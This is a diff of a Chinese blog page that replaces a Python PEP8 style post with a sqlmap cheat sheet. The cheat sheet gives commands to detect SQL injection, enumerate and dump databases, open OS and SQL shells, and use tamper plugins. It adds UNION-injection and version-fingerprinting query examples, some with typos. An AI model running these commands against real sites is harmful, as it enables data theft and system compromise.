@@ -100,7 +100,7 @@
 
 
 
-  <meta name="keywords" content="Python," />
+  <meta name="keywords" content="sqlmap," />
 
 
 
@@ -113,18 +113,18 @@
 
 
 
-<meta name="description" content="变量 常量 : 大写加下划线1USER_CONSTANT   对于不会发生改变的全局变量，使用大写加下划线。">
-<meta name="keywords" content="Python">
+<meta name="description" content="12345678910111213# 判读是否有注入点﻿​$ python sqlmap.py -u &apos;RUL&apos;# 获取数据库$ python sqlmap.py -u &apos;RUL&apos; --dbs# 当前使用数据库$ python sqlmap.py -u &apos;RUL&apos; --current-db# 获取指定库的所有表$ python sqlmap.py -u &apos;RUL&apos; --table -D &quot;数据库名">
+<meta name="keywords" content="sqlmap">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Python代码风格和PEP8">
-<meta property="og:url" content="http://oje.pw/2018/03/31/python-code-style-pep8/index.html">
+<meta property="og:title" content="SQLMap">
+<meta property="og:url" content="http://oje.pw/2018/04/01/sqlmap/index.html">
 <meta property="og:site_name" content="Wish a Starbucks Coffee Here!">
-<meta property="og:description" content="变量 常量 : 大写加下划线1USER_CONSTANT   对于不会发生改变的全局变量，使用大写加下划线。">
+<meta property="og:description" content="12345678910111213# 判读是否有注入点﻿​$ python sqlmap.py -u &apos;RUL&apos;# 获取数据库$ python sqlmap.py -u &apos;RUL&apos; --dbs# 当前使用数据库$ python sqlmap.py -u &apos;RUL&apos; --current-db# 获取指定库的所有表$ python sqlmap.py -u &apos;RUL&apos; --table -D &quot;数据库名">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-04-01T00:20:14.688Z">
+<meta property="og:updated_time" content="2018-04-01T01:39:10.464Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Python代码风格和PEP8">
-<meta name="twitter:description" content="变量 常量 : 大写加下划线1USER_CONSTANT   对于不会发生改变的全局变量，使用大写加下划线。">
+<meta name="twitter:title" content="SQLMap">
+<meta name="twitter:description" content="12345678910111213# 判读是否有注入点﻿​$ python sqlmap.py -u &apos;RUL&apos;# 获取数据库$ python sqlmap.py -u &apos;RUL&apos; --dbs# 当前使用数据库$ python sqlmap.py -u &apos;RUL&apos; --current-db# 获取指定库的所有表$ python sqlmap.py -u &apos;RUL&apos; --table -D &quot;数据库名">
 
 
 
@@ -154,13 +154,13 @@
 
 
 
-  <link rel="canonical" href="http://oje.pw/2018/03/31/python-code-style-pep8/"/>
+  <link rel="canonical" href="http://oje.pw/2018/04/01/sqlmap/"/>
 
 
 
 
 
-  <title>Python代码风格和PEP8 | Wish a Starbucks Coffee Here!</title>
+  <title>SQLMap | Wish a Starbucks Coffee Here!</title>
   
 
 
@@ -294,7 +294,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://oje.pw/2018/03/31/python-code-style-pep8/">
+    <link itemprop="mainEntityOfPage" href="http://oje.pw/2018/04/01/sqlmap/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="oJe">
@@ -311,7 +311,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Python代码风格和PEP8</h1>
+          <h1 class="post-title" itemprop="name headline">SQLMap</h1>
         
 
         <div class="post-meta">
@@ -323,8 +323,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-31T20:48:28+08:00">
-                2018-03-31
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-01T09:06:49+08:00">
+                2018-04-01
               </time>
             
 
@@ -337,7 +337,7 @@
                 <span class="post-meta-divider">|</span>
              <span class="post-meta-item-text">作者&nbsp;&nbsp;</span>
                           
-                network
+                oje
             
           </span>
 
@@ -393,62 +393,10 @@
       
 
       
-        <h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><ul>
-<li>常量 : 大写加下划线<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">USER_CONSTANT</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<p>对于不会发生改变的全局变量，使用大写加下划线。<br><a id="more"></a> </p>
-<ul>
-<li>私有变量 : 小写和一个前导下划线<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_private_value</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<p>Python 中不存在私有变量一说，若是遇到需要保护的变量，使用小写和一个前导下划线。但这只是程序员之间的一个约定，用于警告说明这是一个私有变量，外部类不要去访问它。但实际上，外部类还是可以访问到这个变量。</p>
-<ul>
-<li>内置变量 : 小写，两个前导下划线和两个后置下划线<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__class__</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<p>两个前导下划线会导致变量在解释期间被更名。这是为了避免内置变量和其他变量产生冲突。用户定义的变量要严格避免这种风格。以免导致混乱。<br><!--more--> </p>
-<h2 id="函数和方法"><a href="#函数和方法" class="headerlink" title="函数和方法"></a>函数和方法</h2><p>总体而言应该使用，小写和下划线。但有些比较老的库使用的是混合大小写，即首单词小写，之后每个单词第一个字母大写，其余小写。但现在，小写和下划线已成为规范。</p>
-<ul>
-<li>私有方法 : 小写和一个前导下划线<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def _secrete(self):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"Starbucks"</span>)</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<p>这里和私有变量一样，并不是真正的私有访问权限。同时也应该注意一般函数不要使用两个前导下划线(当遇到两个前导下划线时，Python 的名称改编特性将发挥作用)。</p>
-<ul>
-<li>特殊方法 ：小写和两个前导下划线，两个后置下划线<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def __add__(self, other):</span><br><span class="line">    <span class="built_in">return</span> int.__add__(other)</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<p>这种风格只应用于特殊函数，比如操作符重载等。</p>
-<ul>
-<li>函数参数 : 小写和下划线，缺省值等号两边无空格<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def connect(self, user=None):</span><br><span class="line">    self._user = user</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<h2 id="类"><a href="#类" class="headerlink" title="类"></a>类</h2><p>类总是使用驼峰格式命名，即所有单词首字母大写其余字母小写。类名应该简明，精确，并足以从中理解类所完成的工作。常见的一个方法是使用表示其类型或者特性的后缀，例如:SQLEngine、MimeTypes。对于基类而言，可以使用一个 Base 或者 Abstract 前缀，例如:BaseCookie、AbstractGroup<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class UserProfile(object):</span><br><span class="line">    def __init__(self, profile):</span><br><span class="line">        <span class="built_in">return</span> self._profile = profile</span><br><span class="line"></span><br><span class="line">    def profile(self):</span><br><span class="line">        <span class="built_in">return</span> self._profile</span><br></pre></td></tr></table></figure></p>
-<h2 id="模块和包"><a href="#模块和包" class="headerlink" title="模块和包"></a>模块和包</h2><p>除特殊模块 __init__ 之外，模块名称都使用不带下划线的小写字母。<br>若是它们实现一个协议，那么通常使用lib为后缀，例如:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import smtplib</span><br><span class="line">import os</span><br><span class="line">import sys</span><br></pre></td></tr></table></figure></p>
-<h2 id="关于参数"><a href="#关于参数" class="headerlink" title="关于参数"></a>关于参数</h2><ul>
-<li>不要用断言来实现静态类型检测<br>断言可以用于检查参数，但不应仅仅是进行静态类型检测。Python 是动态类型语言，静态类型检测违背了其设计思想。断言应该用于避免函数不被毫无意义的调用。</li>
-<li>不要滥用 *args 和 **kwargs<br>*args 和 **kwargs 参数可能会破坏函数的健壮性。它们使签名变得模糊，而且代码常常开始在不应该的地方构建小的参数解析器。</li>
-</ul>
-<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><ul>
-<li><p>使用 has 或 is 前缀命名布尔元素</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">is_connect = True</span><br><span class="line">has_member = False</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>用复数形式命名序列</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">members = [<span class="string">'user_1'</span>, <span class="string">'user_2'</span>]</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>用显式名称命名字典</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">person_address = &#123;<span class="string">'user_1'</span>:<span class="string">'10 road WD'</span>, <span class="string">'user_2'</span> : <span class="string">'20 street huafu'</span>&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>避免通用名称<br>诸如 list, dict, sequence 或者 element 这样的名称应该避免。</p>
-</li>
-<li>避免现有名称<br>诸如 os, sys 这种系统已经存在的名称应该避免。</li>
-</ul>
-<h2 id="一些数字"><a href="#一些数字" class="headerlink" title="一些数字"></a>一些数字</h2><ul>
-<li>一行列数 : PEP 8 规定为 79 列，这有些苛刻了。根据自己的情况，比如不要超过满屏时编辑器的显示列数。这样就可以在不动水平游标的情况下，方便的查看代码。</li>
-<li>一个函数 : 不要超过 30 行代码, 即可显示在一个屏幕类，可以不使用垂直游标即可看到整个函数。</li>
-<li>一个类 : 不要超过 200 行代码，不要有超过 10 个方法。</li>
-<li>一个模块 不要超过 500 行。</li>
-</ul>
+        <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 判读是否有注入点﻿​</span></span><br><span class="line">$ python sqlmap.py -u <span class="string">'RUL'</span></span><br><span class="line"><span class="comment"># 获取数据库</span></span><br><span class="line">$ python sqlmap.py -u <span class="string">'RUL'</span> --dbs</span><br><span class="line"><span class="comment"># 当前使用数据库</span></span><br><span class="line">$ python sqlmap.py -u <span class="string">'RUL'</span> --current-db</span><br><span class="line"><span class="comment"># 获取指定库的所有表</span></span><br><span class="line">$ python sqlmap.py -u <span class="string">'RUL'</span> --table -D <span class="string">"数据库名"</span></span><br><span class="line"><span class="comment">#获取表中的字段</span></span><br><span class="line">$ python sqlmap.py -u <span class="string">'RUL'</span> --columns -T <span class="string">"表名"</span> -D <span class="string">"数据库名"</span></span><br><span class="line"><span class="comment">#读取指定字段内容</span></span><br><span class="line">$ python sqlmap.py -u <span class="string">'RUL'</span> --dump -C <span class="string">"字段，字段，字段"</span> -T <span class="string">"表名"</span> -D <span class="string">"数据库名"</span></span><br><span class="line"><span class="comment">#(dump为转存数据）</span></span><br></pre></td></tr></table></figure>
+<a id="more"></a>
+<h4 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 测试注入点权限</span></span><br><span class="line">$ python sqlmap.py -u <span class="string">'RUL'</span> --privileges  <span class="comment">#所有用户权限</span></span><br><span class="line">$ python sqlmap.py -u <span class="string">'RUL'</span> --privileges -U sa  <span class="comment">#sa用户权限</span></span><br><span class="line"><span class="comment"># 执行shell命令</span></span><br><span class="line">$ python sqlmap.py -u <span class="string">'RUL'</span> --os-cmd=<span class="string">"net user"</span>   <span class="comment">#执行net user命令</span></span><br><span class="line">$ python sqlmap.py -u <span class="string">'RUL'</span> --os-shell    <span class="comment">#系统交互的shell</span></span><br><span class="line"><span class="comment">#执行sql命令</span></span><br><span class="line">$ python sqlmap.py -u <span class="string">'RUL'</span> --sql-shell   <span class="comment">#sql交互shell</span></span><br><span class="line">$ python sqlmap.py -u <span class="string">'RUL'</span> --sql-query=<span class="string">"sql语句"</span></span><br><span class="line"><span class="comment"># post提交方式</span></span><br><span class="line">$ python sqlmap.py -u <span class="string">'RUL'</span> --data <span class="string">"post参数"</span></span><br><span class="line"><span class="comment"># 显示详细等级</span></span><br><span class="line">    <span class="comment"># 0：只显示Python的回溯，错误和关键消息。 </span></span><br><span class="line">    <span class="comment"># 1：显示信息和警告消息。 </span></span><br><span class="line">    <span class="comment"># 2：显示调试消息。 </span></span><br><span class="line">    <span class="comment"># 3：有效载荷注入。 </span></span><br><span class="line">    <span class="comment"># 4：显示HTTP请求。 </span></span><br><span class="line">    <span class="comment"># 5：显示HTTP响应头。 </span></span><br><span class="line">    <span class="comment"># 6：显示HTTP响应页面的内容 </span></span><br><span class="line">$ python sqlmap.py -u <span class="string">'RUL'</span> -v 1  </span><br><span class="line"><span class="comment">#注入http请求</span></span><br><span class="line">$ python sqlmap.py -r head.txt --dbs</span><br><span class="line">    [head.txt</span><br><span class="line">    POST /login.php HTTP/1.1</span><br><span class="line">    Host:www.secbug.org</span><br><span class="line">    User-Agent:Mozilla/5.0</span><br><span class="line">    username=admin&amp;password=admin888]</span><br><span class="line"><span class="comment"># 直接连接数据库</span></span><br><span class="line">$ python sqlmap.py -d <span class="string">"mysql://admin:admin@127.0.0.1:3306/test"</span> --dbs</span><br><span class="line"><span class="comment"># 注入等级</span></span><br><span class="line">$ python sqlmap.py -u <span class="string">'RUL'</span> --leavl 3</span><br><span class="line"><span class="comment"># 语句插入到指定位置</span></span><br><span class="line">$ python sqlmap.py -u <span class="string">'http://www.xxser.com/id/2*.html'</span> --dbs</span><br><span class="line"><span class="comment"># 使用插件</span></span><br><span class="line">$ python sqlmap.py -u <span class="string">'RUL'</span> -tamper <span class="string">"插件名"</span></span><br><span class="line"><span class="comment"># 获取帮助</span></span><br><span class="line">$ python sqlmap.py -h</span><br></pre></td></tr></table></figure>
+<h4 id="🌰🌰🌰"><a href="#🌰🌰🌰" class="headerlink" title="🌰🌰🌰"></a>🌰🌰🌰</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 🌰：</span></span><br><span class="line">$ SELCECT *</span><br><span class="line">$ FORM products</span><br><span class="line">$ WHERE category = <span class="string">'bike'</span> AND <span class="string">'1'</span>=<span class="string">'2'</span></span><br><span class="line">$ UNION SELECT *</span><br><span class="line">$ FROM new_products;</span><br><span class="line"><span class="comment"># 🌰：</span></span><br><span class="line">$ SELECT *</span><br><span class="line">$ FROM products</span><br><span class="line">$ WHERE idproduct = 1+1 (?id=%2B1)(+的url编码%2B)</span><br><span class="line"><span class="comment"># 数据库注释</span></span><br><span class="line"><span class="comment"># SQLserver Oracle Postgresql </span></span><br><span class="line">    --(双联字符)</span><br><span class="line">    /*  */</span><br><span class="line"><span class="comment"># Mysql</span></span><br><span class="line">    --</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    /*  */</span><br><span class="line"><span class="comment"># 数据库服务器版本</span></span><br><span class="line"><span class="comment"># SQLserver  </span></span><br><span class="line">$ select @@version</span><br><span class="line"><span class="comment"># Mysql</span></span><br><span class="line">$ select version()</span><br><span class="line">$ select @@version</span><br><span class="line"><span class="comment"># Oracle</span></span><br><span class="line">$ select banner from v<span class="variable">$version</span></span><br><span class="line">$ select banner from v<span class="variable">$version</span> <span class="built_in">where</span> rownum=1</span><br><span class="line"><span class="comment"># Postgresql</span></span><br><span class="line">$ select version()</span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -466,7 +414,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/Python/" rel="tag"># Python</a>
+            <a href="/tags/sqlmap/" rel="tag"># sqlmap</a>
           
         </div>
       
@@ -479,8 +427,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/03/31/python-anaconda/" rel="next" title="Anaconda">
-                <i class="fa fa-chevron-left"></i> Anaconda
+              <a href="/2018/04/01/kali-sources-list-and-ss/" rel="next" title="kali源更换">
+                <i class="fa fa-chevron-left"></i> kali源更换
               </a>
             
           </div>
@@ -489,8 +437,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2018/03/31/g00gle-search/" rel="prev" title="google search">
-                google search <i class="fa fa-chevron-right"></i>
+              <a href="/2018/04/01/black-box-test/" rel="prev" title="黑盒测试清单">
+                黑盒测试清单 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -644,7 +592,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#变量"><span class="nav-number">1.</span> <span class="nav-text">变量</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#函数和方法"><span class="nav-number">2.</span> <span class="nav-text">函数和方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#类"><span class="nav-number">3.</span> <span class="nav-text">类</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#模块和包"><span class="nav-number">4.</span> <span class="nav-text">模块和包</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#关于参数"><span class="nav-number">5.</span> <span class="nav-text">关于参数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#其他"><span class="nav-number">6.</span> <span class="nav-text">其他</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#一些数字"><span class="nav-number">7.</span> <span class="nav-text">一些数字</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#常用参数"><span class="nav-number">1.</span> <span class="nav-text">常用参数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#🌰🌰🌰"><span class="nav-number">2.</span> <span class="nav-text">🌰🌰🌰</span></a></li></ol></div>
             
 
           </div>
